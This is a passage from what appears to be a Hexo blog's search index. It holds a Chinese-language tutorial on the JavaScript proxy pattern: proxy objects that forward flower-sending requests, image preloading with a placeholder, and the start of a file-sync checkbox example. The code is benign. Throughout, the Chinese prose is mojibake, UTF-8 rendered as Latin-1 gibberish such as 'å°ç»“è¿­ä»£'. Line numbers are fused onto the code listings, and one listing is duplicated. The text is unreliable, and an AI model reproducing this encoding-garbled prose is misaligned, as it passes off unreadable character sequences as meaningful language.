å°ç»“è¿­ä»£å™¨æ˜¯ä¸€ç§ç›¸å¯¹ç®€å•çš„æ¨¡å¼ï¼Œç®€å•åˆ°æˆ‘ä»¬éƒ½ä¸è®¤ä¸ºå®ƒæ˜¯ä¸€ç§è®¾è®¡æ¨¡å¼ï¼Œç›®å‰ç»å¤§å¤šéƒ¨åˆ†çš„è¯­è¨€éƒ½å†…ç½®äº†è¿­ä»£å™¨ã€‚]]></content>
      <categories>
        <category>JavaScriptè®¾è®¡æ¨¡å¼</category>
      </categories>
      <tags>
        <tag>JavaScriptè®¾è®¡æ¨¡å¼</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScriptè®¾è®¡æ¨¡å¼â€”â€”ä»£ç†æ¨¡å¼]]></title>
    <url>%2F2019-02-20-JavaScript%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E2%80%94%E2%80%94%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F.html</url>
    <content type="text"><![CDATA[å­¦ä¹ æ›¾æŽ¢çš„ ã€ŠJavaScriptè®¾è®¡æ¨¡å¼ä¸Žå¼€å‘å®žè·µã€‹å¹¶åšè®°å½•ã€‚ ä¹¦ç±çš„è´­ä¹°é“¾æŽ¥ è®¾è®¡æ¨¡å¼çš„å®šä¹‰æ˜¯ï¼šåœ¨é¢å‘å¯¹è±¡è½¯ä»¶è®¾è®¡è¿‡ç¨‹ä¸­é’ˆå¯¹ç‰¹å®šé—®é¢˜çš„ç®€æ´è€Œä¼˜é›…çš„è§£å†³æ–¹æ¡ˆã€‚ é€šä¿—ä¸€ç‚¹ï¼Œè®¾è®¡æ¨¡å¼æ˜¯åœ¨æŸç§åœºåˆä¸‹å¯¹æŸä¸ªé—®é¢˜çš„ä¸€ç§è§£å†³æ–¹æ¡ˆã€‚æ˜¯ç»™é¢å‘å¯¹è±¡è½¯ä»¶å¼€å‘ä¸­çš„ä¸€äº›å¥½çš„è®¾è®¡å–ä¸ªåå­—ã€‚ JavaScriptè®¾è®¡æ¨¡å¼â€”â€”ä»£ç†æ¨¡å¼ä»£ç†æ¨¡å¼æ˜¯ä¸ºäº†ä¸€ä¸ªå¯¹è±¡æä¾›ä¸€ä¸ªä»£ç”¨å“æˆ–å ä½ç¬¦ï¼Œä»¥ä¾¿æŽ§åˆ¶å¯¹å®ƒçš„è®¿é—®ã€‚ ä»£ç†æ¨¡å¼åœ¨ç”Ÿæ´»ä¸­å¯ä»¥æ‰¾åˆ°å¾ˆå¤šåœºæ™¯ã€‚æ¯”å¦‚ï¼šæ˜Žæ˜Ÿéƒ½æœ‰ç»çºªäººä½œä¸ºä»£ç†ã€‚å¦‚æžœæƒ³è¯·æ˜Žæ˜Ÿæ¥åŠžä¸€åœºå•†ä¸šæ¼”å‡ºï¼Œåªèƒ½è”ç³»ä»–çš„ç»çºªäººã€‚ç»çºªäººä¼šæŠŠå•†ä¸šæ¼”å‡ºçš„ç»†èŠ‚å’ŒæŠ¥é…¬è°ˆå¥½åŽï¼Œå†æŠŠåˆåŒäº¤ç»™æ˜Žæ˜Ÿç­¾ã€‚ ä»£ç†æ¨¡å¼çš„å…³é”®æ˜¯ï¼Œå½“å®¢æˆ·ä¸æ–¹ä¾¿ç›´æŽ¥è®¿é—®ä¸€ä¸ªå¯¹è±¡æˆ–è€…ä¸æ»¡è¶³éœ€æ±‚çš„æ—¶å€™ï¼Œæä¾›ä¸€ä¸ªæ›¿èº«å¯¹è±¡æ¥æŽ§åˆ¶è¿™ä¸ªå¯¹è±¡çš„è®¿é—®ï¼Œå®¢æˆ·å®žé™…ä¸Šè®¿é—®çš„æ˜¯æ›¿èº«å¯¹è±¡ã€‚æ›¿èº«å¯¹è±¡å¯¹è¯·æ±‚åšå‡ºä¸€äº›å¤„ç†ä¹‹åŽï¼Œå†æŠŠè¯·æ±‚è½¬äº¤ç»™æœ¬ä½“å¯¹è±¡ã€‚ ç¬¬ä¸€ä¸ªä¾‹å­åœ¨å››æœˆä¸€ä¸ªæ™´æœ—çš„æ—©æ™¨ï¼Œå°æ˜Žé‡è§äº†ä»–çš„ç™¾åˆ†ç™¾å¥³å­©ï¼Œæˆ‘ä»¬æš‚ä¸”ç§°å‘¼å°æ˜Žçš„å¥³ç¥žä¸ºAã€‚ä¸¤å¤©ä¹‹åŽï¼Œå°æ˜Žå†³å®šç»™ A é€ä¸€æŸèŠ±æ¥è¡¨ç™½ã€‚åˆšå¥½å°æ˜Žæ‰“å¬åˆ° A å’Œä»–æœ‰ä¸€ä¸ªå…±åŒçš„æœ‹å‹ Bï¼ŒäºŽæ˜¯å†…å‘çš„å°æ˜Žå†³å®šè®© B æ¥ä»£æ›¿è‡ªå·±å®Œæˆé€èŠ±è¿™ä»¶äº‹æƒ…ã€‚ ç”¨ä»£ç†æ¥æè¿°å°æ˜Žè¿½å¥³ç¥žçš„è¿‡ç¨‹ï¼Œå…ˆçœ‹çœ‹ä¸ç”¨ä»£ç†æ¨¡å¼çš„æƒ…å†µï¼š 1234567891011121314var Flower = function () &#123; &#125;;var xiaoming = &#123; sendFlower: function (target) &#123; var flower = new Flower(); target.receiveFlower(flower); &#125;&#125;var A = &#123; receiveFlower: function (flower) &#123; console.log('æ”¶åˆ°èŠ±ï¼š' + flower); &#125;&#125;xiaoming.sendFlower(A); æŽ¥ç€å¼•å…¥ä»£ç†B 1234567891011121314151617181920var Flower = function () &#123; &#125;;var xiaoming = &#123; sendFlower: function (target) &#123; var flower = new Flower(); target.receiveFlower(flower); &#125;&#125;var B = &#123; receiveFlower: function (flower) &#123; A.receiveFlower(flower); &#125;&#125;var A = &#123; receiveFlower: function (flower) &#123; console.log('æ”¶åˆ°èŠ±ï¼š' + flower); &#125;&#125;xiaoming.sendFlower(B); åœ¨è¿™é‡Œï¼Œå¼•å…¥ä»£ç†æ¨¡å¼çœ‹èµ·æ¥æ¯«æ— ä½œç”¨ï¼Œåè€Œä¼šå¤æ‚ä»£ç ï¼Œå®ƒæ‰€ä½œçš„åªæ˜¯æŠŠè¯·æ±‚ç®€å•åœ°è½¬äº¤ç»™äº†æœ¬ä½“ã€‚ çŽ°åœ¨æˆ‘ä»¬æ”¹å˜æ•…äº‹çš„èƒŒæ™¯è®¾å®šï¼Œå‡è®¾å½“A åœ¨å¿ƒæƒ…å¥½çš„æ—¶å€™æ”¶åˆ°èŠ±ï¼Œå°æ˜Žè¡¨ç™½æˆåŠŸçš„å‡ çŽ‡æœ‰ 60%ï¼Œè€Œå½“ Aåœ¨å¿ƒæƒ…å·®çš„æ—¶å€™æ”¶åˆ°èŠ±ï¼Œå°æ˜Žè¡¨ç™½çš„æˆåŠŸçŽ‡æ— é™è¶‹è¿‘äºŽ0. å°æ˜Žè·ŸAæ‰åˆšåˆšè®¤è¯†äº†ä¸¤å¤©ï¼Œæ— æ³•åˆ¤åˆ«Aä»€ä¹ˆæ—¶å€™å¿ƒæƒ…å¥½ï¼Œä½†æ˜¯Bæ˜¯Açš„å¥½æœ‹å‹ï¼Œå¥¹ä¼šç›‘å¬Açš„å¿ƒæƒ…å˜åŒ–ï¼Œç„¶åŽé€‰æ‹© A å¿ƒæƒ…å¥½çš„æ—¶å€™æŠŠèŠ±è½¬äº¤ç»™ Aã€‚ ä»£ç å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425var Flower = function () &#123; &#125;;var xiaoming = &#123;sendFlower: function (target) &#123; var flower = new Flower(); target.receiveFlower(flower);&#125;&#125;var B = &#123;receiveFlower: function (flower) &#123; A.listenGoodMood(function () &#123; // ç›‘å¬ A çš„å¥½å¿ƒæƒ… A.receiveFlower(flower); &#125;)&#125;&#125;var A = &#123;receiveFlower: function (flower) &#123; console.log('æ”¶åˆ°èŠ±ï¼š' + flower);&#125;,listenGoodMood: function (fn) &#123; setTimeout(function () &#123; // å‡è®¾10ç§’åŽ A çš„å¿ƒæƒ…å˜å¥½äº† fn(); &#125;, 10000);&#125;&#125;xiaoming.sendFlower(B); ä¿æŠ¤ä»£ç†å’Œè™šæ‹Ÿä»£ç†è™½ç„¶è¿™åªæ˜¯ä¸€ä¸ªè™šæ‹Ÿçš„ä¾‹å­ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä»Žä¸­æ‰¾åˆ°ä¸¤ç§ä»£ç†æ¨¡å¼çš„èº«å½±ã€‚ä»£ç† B å¯ä»¥å¸®åŠ© A è¿‡æ»¤æŽ‰ä¸€äº›è¯·æ±‚ï¼Œæ¯”å¦‚é€èŠ±çš„äººä¸­å¹´é¾„å¤ªå¤§çš„æˆ–è€…æ˜¯ç»æµŽèƒ½åŠ›ä¸å¤Ÿçš„ã€‚è¿™ç§è¯·æ±‚å°±å¯ä»¥åœ¨ä»£ç† B å¤„è¢«è¿‡æ»¤æŽ‰ã€‚è¿™ç§ä»£ç†å«åšä¿æŠ¤ä»£ç†ã€‚A å’Œ B ä¸€ä¸ªå……å½“ç™½è„¸ï¼Œä¸€ä¸ªå……å½“ é»‘è„¸ã€‚ç™½è„¸ A ç»§ç»­ä¿æŒè‰¯å¥½çš„å¥³ç¥žå½¢è±¡ï¼Œä¸å¸Œæœ›ç›´æŽ¥æ‹’ç»ä»»ä½•äººï¼ŒäºŽæ˜¯æ‰¾äº† é»‘è„¸ B æ¥æŽ§åˆ¶å¯¹ A çš„è®¿é—®ã€‚ å¦å¤–ï¼Œå‡è®¾åœ¨çŽ°å®žä¸­èŠ±çš„ä»·æ ¼ä¸è²ï¼Œå¯¼è‡´åœ¨ç¨‹åºä¸–ç•Œä¸­ï¼Œnew Flower ä¹Ÿæ˜¯ä¸€ä¸ªä»£ä»·æ˜‚è´µçš„æ“ä½œï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æŠŠ new Flower çš„æ“ä½œäº¤ç»™ä»£ç† B åŽ»æ‰§è¡Œï¼Œä»£ç† B ä¼šé€‰æ‹©åœ¨ A å¿ƒæƒ…å¥½çš„æ—¶å€™å†æ‰§è¡Œ new Flower ï¼Œè¿™æ˜¯ä»£ç†æ¨¡å¼çš„å¦ä¸€ç§å½¢å¼ï¼Œå«åšè™šæ‹Ÿä»£ç†ã€‚è™šæ‹Ÿä»£ç†æŠŠä¸€äº›æ“ä½œå¼€é”€å¾ˆå¤§çš„å¯¹è±¡ï¼Œå»¶è¿Ÿåˆ°çœŸæ­£éœ€è¦å®ƒçš„æ—¶å€™åŽ»åˆ›å»ºã€‚ ä»£ç å¦‚ä¸‹ï¼š 12345678var B = &#123; receiveFlower: function (flower) &#123; A.listenGoodMood(function () &#123; // ç›‘å¬ A çš„å¥½å¿ƒæƒ… var flower = new Flower(); A.receiveFlower(flower); &#125;) &#125;&#125; ä¿æŠ¤ä»£ç†ç”¨äºŽæŽ§åˆ¶ä¸åŒæƒé™çš„å¯¹è±¡å¯¹ç›®æ ‡å¯¹è±¡çš„è®¿é—®ï¼Œä½†åœ¨ JavaScript ä¸­å¹¶ä¸å®¹æ˜“å®žçŽ°ä¿æŠ¤ä»£ç†ï¼Œå› ä¸ºæˆ‘ä»¬æ— æ³•åˆ¤æ–­è°è®¿é—®äº†æŸä¸ªå¯¹è±¡ã€‚è€Œè™šæ‹Ÿä»£ç†æ˜¯æœ€å¸¸è§çš„ä¸€ç§ä»£ç†æ¨¡å¼ã€‚ è™šæ‹Ÿä»£ç†å®žçŽ°å›¾ç‰‡é¢„åŠ è½½åœ¨ Web å¼€å‘ä¸­ï¼Œå›¾ç‰‡é¢„åŠ è½½æ˜¯ä¸€ç§å¸¸ç”¨çš„æŠ€æœ¯ï¼Œå¦‚æžœç›´æŽ¥ç»™æŸä¸ª img æ ‡ç­¾èŠ‚ç‚¹è®¾ç½® src å±žæ€§ï¼Œç”±äºŽå›¾ç‰‡è¿‡å¤§æˆ–è€…æ˜¯ç½‘ç»œä¸ä½³ï¼Œå›¾ç‰‡çš„ä½ç½®å¸¸å¸¸æœ‰æ®µå®žé™…æ˜¯ä¸€ç‰‡ç©ºç™½ã€‚å¸¸è§çš„åšæ³•æ˜¯å…ˆç”¨ä¸€å¼  loading å›¾ç‰‡å ä½ï¼Œç„¶åŽç”¨å¼‚æ­¥çš„æ–¹å¼åŠ è½½å›¾ç‰‡ï¼Œç­‰å›¾ç‰‡åŠ è½½å¥½äº†å†æŠŠå®ƒå¡«å……åˆ° img èŠ‚ç‚¹ä¸­ï¼Œè¿™ç§åœºæ™¯å°±å¾ˆé€‚åˆä½¿ç”¨è™šæ‹Ÿä»£ç†ã€‚ ä¸‹é¢å®žçŽ°è¿™ä¸ªè™šæ‹Ÿä»£ç†ï¼Œé¦–å…ˆåˆ›å»ºä¸€ä¸ªæ™®é€šçš„æœ¬ä½“å¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡è´Ÿè´£å¾€é¡µé¢ä¸­åˆ›å»ºä¸€ä¸ª img æ ‡ç­¾ï¼Œå¹¶ä¸”æä¾›ä¸€ä¸ªå¯¹å¤–çš„ setSrc æŽ¥å£ï¼Œä¾¿å¯ä»¥ç»™è¯¥ img æ ‡ç­¾è®¾ç½®src å±žæ€§ï¼š 12345678910var myImage = (function () &#123;var imgNode = document.createElement('img');document.body.appendChild(imgNode);return &#123; setSrc: function (src) &#123; imgNode.src = src; &#125;&#125;&#125;)();myImage.setSrc('https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1550806593869&amp;di=f2c243dcd52c67fb8cb9c730bfe97cff&amp;imgtype=0&amp;src=http%3A%2F%2Fimg1.xcarimg.com%2Fexp%2F2872%2F2875%2F2937%2F20101220130509576539.jpg'); F12 è°ƒå¼€æµè§ˆå™¨è°ƒå¼ï¼Œåˆ‡æ¢åˆ° Network ï¼Œç¦æ­¢ç¼“å­˜ï¼ŒæŠŠé€Ÿåº¦è°ƒä¸º 5KB/s ï¼Œå¯ä»¥çœ‹åˆ°é¡µé¢ä¸­åœ¨å›¾ç‰‡åŠ è½½å®Œæˆä¹‹å‰ï¼Œæœ‰ä¸€æ®µé•¿é•¿çš„ç©ºç™½æ—¶é—´ã€‚ çŽ°åœ¨å¼€å§‹å¼•å…¥ä»£ç†å¯¹è±¡ proxyImage,é€šè¿‡è¿™ä¸ªä»£ç†å¯¹è±¡ï¼Œåœ¨å›¾ç‰‡è¢«çœŸæ­£åŠ è½½å¥½ä¹‹å‰ï¼Œé¡µé¢ä¸­å°†ä¼šå‡ºçŽ°ä¸€å¼ å ä½å›¾ï¼Œæ¥æç¤ºç”¨æˆ·å›¾ç‰‡æ­£åœ¨åŠ è½½ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243var myImage = (function () &#123; var imgNode = document.createElement('img'); document.body.appendChild(imgNode); return &#123; setSrc: function (src) &#123; imgNode.src = src; &#125; &#125;&#125;)();var proxyImage = (function () &#123; var img = new Image; img.onload = function () &#123; myImage.setSrc(this.src); &#125; return &#123; setSrc: function (src) &#123; myImage.setSrc('file:///C:/Users/Administrator/Desktop/timg.gif'); img.src = src; &#125; &#125;&#125;)();proxyImage.setSrc('https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1550806593869&amp;di=f2c243dcd52c67fb8cb9c730bfe97cff&amp;imgtype=0&amp;src=http%3A%2F%2Fimg1.xcarimg.com%2Fexp%2F2872%2F2875%2F2937%2F20101220130509576539.jpg'); var myImage = (function () &#123; var imgNode = document.createElement('img'); document.body.appendChild(imgNode); return &#123; setSrc: function (src) &#123; imgNode.src = src; &#125; &#125;&#125;)();var proxyImage = (function () &#123; var img = new Image; img.onload = function () &#123; myImage.setSrc(this.src); &#125; return &#123; setSrc: function (src) &#123; myImage.setSrc('file:///C:/Users/Administrator/Desktop/timg.gif'); img.src = src; &#125; &#125;&#125;)();proxyImage.setSrc('https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1550806593869&amp;di=f2c243dcd52c67fb8cb9c730bfe97cff&amp;imgtype=0&amp;src=http%3A%2F%2Fimg1.xcarimg.com%2Fexp%2F2872%2F2875%2F2937%2F20101220130509576539.jpg'); çŽ°åœ¨æˆ‘ä»¬é€šè¿‡ proxyImage é—´æŽ¥åœ°è®¿é—® MyImage ã€‚proxyImage æŽ§åˆ¶äº†å®¢æˆ·å¯¹ MyImage çš„è®¿é—®ï¼Œå¹¶åœ¨æ­¤è¿‡ç¨‹ä¸­åŠ å…¥äº†ä¸€äº›é¢å¤–çš„æ“ä½œï¼Œæ¯”å¦‚åœ¨çœŸæ­£çš„å›¾ç‰‡åŠ è½½ä¹‹å‰ï¼Œå…ˆæŠŠ img èŠ‚ç‚¹çš„ src è®¾ç½®ä¸ºæœ¬åœ°çš„ä¸€å¼  loading å›¾ç‰‡ã€‚ ä»£ç†çš„æ„ä¹‰ä¸ç”¨ä»£ç†çš„é¢„åŠ è½½å›¾ç‰‡å‡½æ•°å®žçŽ°å¦‚ä¸‹: 123456789101112131415var MyImage = (function () &#123; var imgNode = document.createElement('img'); document.body.appendChild(imgNode); var img = new Image; img.onload = function () &#123; imgNode.src = img.src; &#125;; return &#123; setSrc: function (src) &#123; imgNode.src = 'file:///C:/Users/Administrator/Desktop/timg.gif'; img.src = src; &#125; &#125;&#125;)(); MyImage.setSrc('https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1550806593869&amp;di=f2c243dcd52c67fb8cb9c730bfe97cff&amp;imgtype=0&amp;src=http%3A%2F%2Fimg1.xcarimg.com%2Fexp%2F2872%2F2875%2F2937%2F20101220130509576539.jpg'); ä¸ºäº†è¯´æ˜Žä»£ç†çš„æ„ä¹‰ï¼Œå¼•å…¥ä¸€ä¸ªé¢å‘å¯¹è±¡è®¾è®¡çš„åŽŸåˆ™â€”â€”å•ä¸€èŒè´£åŽŸåˆ™ã€‚ å•ä¸€èŒè´£åŽŸåˆ™æŒ‡çš„æ˜¯ï¼Œå°±ä¸€ä¸ªç±»ï¼ˆé€šå¸¸ä¹ŸåŒ…æ‹¬å¯¹è±¡å’Œå‡½æ•°ç­‰ï¼‰è€Œè¨€ï¼Œåº”è¯¥ä»…æœ‰ä¸€ä¸ªå¼•èµ·å®ƒå˜åŒ–çš„åŽŸå› ã€‚å¦‚æžœä¸€ä¸ªå¯¹è±¡æ‰¿æ‹…äº†å¤šé¡¹èŒè´£ï¼Œå°±æ„å‘³ç€è¿™ä¸ªå¯¹è±¡å°†å˜å¾—å·¨å¤§ï¼Œå¼•èµ·å®ƒçš„å˜åŒ–åŽŸå› å¯èƒ½æœ‰å¾ˆå¤šä¸ªã€‚é¢å‘å¯¹è±¡çš„è®¾è®¡é¼“åŠ±å°†è¡Œä¸ºåˆ†å¸ƒåˆ°ç»†ç²’åº¦çš„å¯¹è±¡ä¹‹ä¸­ï¼Œå¦‚æžœä¸€ä¸ªå¯¹è±¡æ‰¿æ‹…çš„èŒè´£è¿‡å¤šï¼Œç­‰äºŽæŠŠè¿™äº›èŒè´£è€¦åˆåˆ°äº†ä¸€èµ·ï¼Œè¿™ç§è€¦åˆå¯¼è‡´è„†å¼±å’Œä½Žå†…èšçš„è®¾è®¡ã€‚å½“å˜åŒ–å‘ç”Ÿçš„æ—¶å€™ï¼Œè®¾è®¡å¯èƒ½ä¼šé­åˆ°ç ´åã€‚ èŒè´£è¢«å®šä¹‰ä¸ºå¼•èµ·å˜åŒ–çš„åŽŸå› ã€‚ä¸Šæ®µä»£ç ä¸­ MyImage å¯¹è±¡é™¤äº†è´Ÿè´£ç»™ img èŠ‚ç‚¹è®¾ç½® src å¤–ï¼Œè¿˜è¦è´Ÿè´£é¢„åŠ è½½å›¾ç‰‡ã€‚æˆ‘ä»¬æ­£åœ¨å¤„ç†ä¸€ä¸ªèŒè´£çš„æ—¶å€™ï¼Œæœ‰å¯èƒ½å› ä¸ºå…¶å¼ºè€¦åˆæ€§å½±å“å¦å¤–ä¸€ä¸ªèŒè´£çš„å®žçŽ°ã€‚ å¦å¤–ï¼Œåœ¨é¢å‘å¯¹è±¡çš„ç¨‹åºè®¾è®¡ä¸­ï¼Œåœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œè‹¥è¿åäº†å…¶ä»–ä»»ä½•è§„åˆ™ï¼ŒåŒæ—¶å°†è¿åå¼€æ”¾â€”â€”å°é—­åŽŸåˆ™ã€‚å¦‚æžœæˆ‘ä»¬åªæ˜¯åœ¨ç½‘ç»œä¸­èŽ·å–ä¸€äº›ä½“ç§¯å¾ˆå°çš„å›¾ç‰‡ï¼Œæˆ–è€… 5 å¹´åŽçš„ç½‘é€Ÿå¿«åˆ°æ ¹æœ¬ä¸éœ€è¦å†é¢„åŠ è½½äº†ã€‚æˆ‘ä»¬å¯èƒ½å¸Œæœ›æŠŠé¢„åŠ è½½çš„å›¾ç‰‡è¿™æ®µä»£ç ä»Ž MyImage ä¸­åˆ é™¤æŽ‰ã€‚è¿™æ—¶å€™å°±ä¸å¾—ä¸æ”¹åŠ¨ MyImage å¯¹è±¡äº†ã€‚ å®žé™…ä¸Šï¼Œæˆ‘ä»¬éœ€è¦çš„åªæ˜¯ç»™ img èŠ‚ç‚¹è®¾ç½® src ,é¢„åŠ è½½å›¾ç‰‡åªæ˜¯ä¸€ä¸ªé”¦ä¸Šæ·»èŠ±çš„åŠŸèƒ½ã€‚å¦‚æžœèƒ½æŠŠè¿™ä¸ªæ“ä½œæ”¾åœ¨å¦ä¸€ä¸ªå¯¹è±¡ä¸­ï¼Œè‡ªç„¶æ˜¯ä¸€ä¸ªæœ€å¥½çš„æ–¹æ³•ã€‚äºŽæ˜¯ä»£ç†çš„ä½œç”¨å°±åœ¨è¿™é‡Œä½“çŽ°å‡ºæ¥äº†ï¼Œä»£ç†è´Ÿè´£é¢„åŠ è½½å›¾ç‰‡ï¼ŒåŠ è½½å®Œä¹‹åŽï¼ŒæŠŠè¯·æ±‚äº¤ç»™æœ¬ä½“ MyImageã€‚ é€šè¿‡ä»£ç†å¯¹è±¡ï¼Œå®žé™…ä¸Šç»™ç³»ç»Ÿæ·»åŠ äº†æ–°çš„è¡Œä¸ºã€‚è¿™æ˜¯ç¬¦åˆå¼€å‘â€”â€”å°é—­çš„åŽŸåˆ™ã€‚ç»™ img èŠ‚ç‚¹è®¾ç½® src å’Œ å›¾ç‰‡é¢„åŠ è½½è¿™é‡Œä¸¤ä¸ªåŠŸèƒ½ï¼Œè¢«éš”ç¦»åœ¨äº†ä¸¤ä¸ªå¯¹è±¡é‡Œé¢ï¼Œå®ƒä»¬å¯ä»¥å„è‡ªå˜åŒ–è€Œä¸ä¼šå½±å“å¯¹å¯¹æ–¹ã€‚ ä»£ç†å’Œæœ¬ä½“æŽ¥å£çš„ä¸€è‡´æ€§ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œå…³é”®çš„æ˜¯ä»£ç†å¯¹è±¡å’Œæœ¬ä½“éƒ½æä¾›äº† setSrc æ–¹æ³•ï¼Œåœ¨å®¢æˆ·çœ‹æ¥ï¼Œä»£ç†å¯¹è±¡å’Œæœ¬ä½“å¯¹è±¡æ˜¯ä¸€è‡´çš„ï¼Œä»£ç†æŽ¥æ‰‹è¯·æ±‚çš„è¿‡ç¨‹å¯¹äºŽç”¨æˆ·æ¥è¯´æ˜¯é€æ˜Žçš„ï¼Œç”¨æˆ·å¹¶ä¸æ¸…æ¥šå’Œæœ¬ä½“çš„åŒºåˆ«ï¼Œè¿™æ ·åšæœ‰ä¸¤ä¸ªå¥½å¤„ï¼š ç”¨æˆ·å¯ä»¥æ”¾å¿ƒè¯·æ±‚ä»£ç†ï¼Œä»–åªå…³å¿ƒæ˜¯å¦å¯ä»¥æ‹¿åˆ°æƒ³è¦çš„ç»“æžœã€‚ åœ¨ä»»ä½•ä½¿ç”¨æœ¬ä½“çš„åœ°æ–¹éƒ½å¯ä»¥æ›¿æ¢æˆä½¿ç”¨ä»£ç†ã€‚ Java ç­‰è¯­è¨€ä¸­ï¼Œä»£ç†å’Œæœ¬ä½“éƒ½éœ€è¦æ˜¾å¼åœ°å®žçŽ°åŒä¸€ä¸ªæŽ¥å£ï¼Œä¸€æ–¹é¢æŽ¥å£è¦ä¿è¯å®ƒä»¬ä¼šæ‹¥æœ‰åŒæ ·çš„æ–¹æ³•ï¼Œå¦ä¸€æ–¹æ³•ï¼Œé¢å‘æŽ¥å£ç¼–ç¨‹è¿Žåˆä¾èµ–å€’ç½®çš„åŽŸåˆ™ï¼Œé€šè¿‡æŽ¥å£è¿›è¡Œå‘ä¸Šè½¬åž‹ï¼Œä»Žè€Œé¿å¼€äº†ç¼–è¯‘å™¨çš„ç±»åž‹æ£€æŸ¥ï¼Œä»£ç†å’Œæœ¬ä½“å¯ä»¥è¢«æ›¿æ¢ä½¿ç”¨ã€‚ åœ¨ Java è¿™ç§åŠ¨æ€ç±»åž‹è¯­è¨€ä¸­ï¼Œæˆ‘ä»¬æœ‰æ—¶å€™é€šè¿‡é¸­å­ç±»åž‹æ¥æ£€æµ‹ä»£ç†å’Œæœ¬ä½“æ˜¯å¦éƒ½å®žçŽ°äº† setSrc æ–¹æ³•ï¼Œå¦å¤–å¤§å¤šæ•°æ—¶å€™ç”šè‡³å¹²è„†ä¸åšæ£€æµ‹ï¼Œå…¨éƒ¨ä¾èµ–ç¨‹åºå‘˜çš„è‡ªè§‰æ€§ï¼Œè¿™å¯¹äºŽç¨‹åºçš„å¥å£®æ€§æ˜¯æœ‰å½±å“çš„ã€‚ å¦‚æžœæ˜¯ä»£ç†å¯¹è±¡å’Œæœ¬ä½“å¯¹è±¡éƒ½æ˜¯ä¸€ä¸ªå‡½æ•°ï¼ˆå‡½æ•°ä¹Ÿæ˜¯å¯¹è±¡ï¼‰ï¼Œå‡½æ•°å¿…ç„¶éƒ½èƒ½è¢«æ‰§è¡Œï¼Œåˆ™å¯ä»¥è®¤ä¸ºå®ƒä»¬æ‹¥æœ‰ä¸€è‡´çš„â€æŽ¥å£â€œã€‚ 12345678910111213141516171819var myImage = (function () &#123;var imgNode = document.createElement('img');document.body.appendChild(imgNode);return function (src) &#123; imgNode.src = src;&#125;&#125;)();var proxyImage = (function () &#123;var img = new Image;img.onload = function () &#123; myImage(this.src);&#125;return function (src) &#123; myImage('æœ¬åœ°åŠ è½½å›¾ç‰‡'); img.src = src;&#125;&#125;)();proxyImage('https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1550806593869&amp;di=f2c243dcd52c67fb8cb9c730bfe97cff&amp;imgtype=0&amp;src=http%3A%2F%2Fimg1.xcarimg.com%2Fexp%2F2872%2F2875%2F2937%2F20101220130509576539.jpg') è™šæ‹Ÿä»£ç†åˆå¹¶ HTTP è¯·æ±‚æœ‰è¿™ä¹ˆä¸€ä¸ªåœºæ™¯ï¼šæ¯å‘¨æˆ‘ä»¬éƒ½è¦å†™ä¸€ä»½å·¥ä½œå‘¨æŠ¥ï¼Œå‘¨æŠ¥è¦äº¤ç»™æ€»ç›‘æ‰¹é˜…ã€‚æ€»ç›‘æ‰‹ä¸‹ç®¡ç†ç€ 150 ä¸ªå‘˜å·¥ï¼Œå¦‚æžœæˆ‘ä»¬æ¯ä¸ªäººç›´æŽ¥æŠŠå‘¨æŠ¥äº¤ç»™æ€»ç›‘ï¼Œé‚£æ€»ç›‘å¯èƒ½è¦æŠŠä¸€æ•´å‘¨çš„æ—¶é—´éƒ½èŠ±åœ¨æŸ¥çœ‹é‚®ä»¶ä¸Šé¢ã€‚ çŽ°åœ¨æˆ‘ä»¬æŠŠå‘¨æŠ¥éƒ½å‘ç»™å„è‡ªçš„ç»„é•¿ï¼Œç»„é•¿ä½œä¸ºä»£ç†ï¼ŒæŠŠç»„å†…æˆå‘˜çš„å‘¨æŠ¥æç‚¼åˆå¹¶æˆä¸€ä»½åŽä¸€æ¬¡æ€§äº¤ç»™æ€»ç›‘ï¼Œè¿™æ ·ä¸€æ¥ï¼Œæ€»ç›‘çš„é‚®ä»¶ä¾¿æ¸…å‡€äº†å¾ˆå¤šã€‚ è¿™æ ·çš„ä¾‹å­åœ¨ Web å¼€å‘ä¸­å¾ˆå¸¸è§ï¼Œç½‘ç»œè¯·æ±‚ä¹Ÿè®¸æ˜¯æœ€å¤§çš„å¼€é”€ã€‚å‡è®¾æˆ‘ä»¬åœ¨åšä¸€ä¸ªæ–‡ä»¶åŒæ­¥çš„åŠŸèƒ½ï¼Œå½“æˆ‘ä»¬é€‰ä¸­ä¸€ä¸ª checkbox çš„æ—¶å€™ï¼Œå®ƒå¯¹åº”çš„æ–‡ä»¶å°±ä¼šè¢«åŒæ­¥åˆ°å¦ä¸€å°å¤‡ç”¨æœåŠ¡å™¨ä¸Šé¢ã€‚ é¡µé¢ä¸­æ”¾ç½®å¥½è¿™äº› checkbox èŠ‚ç‚¹: 123456789&lt;input type="checkbox" id="1" /&gt;1&lt;input type="checkbox" id="2" /&gt;2&lt;input type="checkbox" id="3" /&gt;3&lt;input type="checkbox" id="4" /&gt;4&lt;input type="checkbox" id="5" /&gt;5&lt;input type="checkbox" id="6" /&gt;6&lt;input type="checkbox" id="7" /&gt;7&lt;input type="checkbox" id="8" /&gt;8&lt;input type="checkbox" id="9" /&gt;9 æŽ¥ä¸‹æ¥ï¼Œç»™è¿™äº› checkbox ç»‘å®šç‚¹å‡»äº‹ä»¶ï¼Œå¹¶åœ¨ç‚¹å‡»çš„åŒæ—¶å¾€å¦ä¸€å°æœåŠ¡å™¨åŒæ­¥æ–‡ä»¶ï¼š 12345678910111213var synchronousFile = function (id) &#123; console.log('å¼€å§‹åŒæ­¥æ–‡ä»¶ï¼Œidä¸ºï¼š' + id);&#125;var checkbox = document.getElementsByTagName('input');for (var i = 0, c; c = checkbox[i++];) &#123; c.onclick = function () &#123; if 